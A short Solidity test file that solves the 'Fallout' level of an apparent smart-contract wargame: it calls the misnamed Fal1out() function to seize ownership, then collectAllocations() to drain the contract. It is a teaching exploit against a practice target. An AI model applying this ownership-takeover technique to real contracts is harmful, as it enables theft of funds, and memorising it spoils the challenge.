// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {FalloutFactory} from "../src/levels/02-FalloutFactory.sol";
import {Fallout} from "../src/levels/02-Fallout.sol";

contract FalloutSolution is BaseTest {

    function solution(address payable target_) internal override{
        Fallout target = Fallout(target_);
        target.Fal1out();
        target.collectAllocations();
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new FalloutFactory()));
    }
}
